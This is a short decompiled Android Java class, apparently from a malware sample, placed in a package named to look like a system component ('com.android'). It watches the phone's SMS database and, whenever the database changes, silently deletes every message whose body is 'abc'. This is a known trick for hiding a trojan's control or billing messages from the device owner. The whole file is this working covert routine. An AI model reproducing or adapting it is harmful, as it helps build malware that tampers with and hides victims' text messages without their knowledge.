package com.android;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SMSDBObserver extends ContentObserver
{
  public static final String SMS_URI_ALL = "content://sms/";
  public static final String SMS_URI_DRAFT = "content://sms/draft";
  public static final String SMS_URI_FAILED = "content://sms/failed";
  public static final String SMS_URI_INBOX = "content://sms/inbox";
  public static final String SMS_URI_OUTBOX = "content://sms/outbox";
  public static final String SMS_URI_QUEUED = "content://sms/queued";
  public static final String SMS_URI_SEND = "content://sms/sent";
  private Cursor cursor = null;
  Context mBase;

  public SMSDBObserver(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.mBase = paramContext;
  }

  public ContentResolver getContentResolver()
  {
    return this.mBase.getContentResolver();
  }

  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    Uri localUri = Uri.parse("content://sms/");
    getContentResolver().delete(localUri, "body=?", new String[] { "abc" });
  }
}

/* Location:
 * Qualified Name:     com.android.SMSDBObserver
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.6.1-SNAPSHOT
 */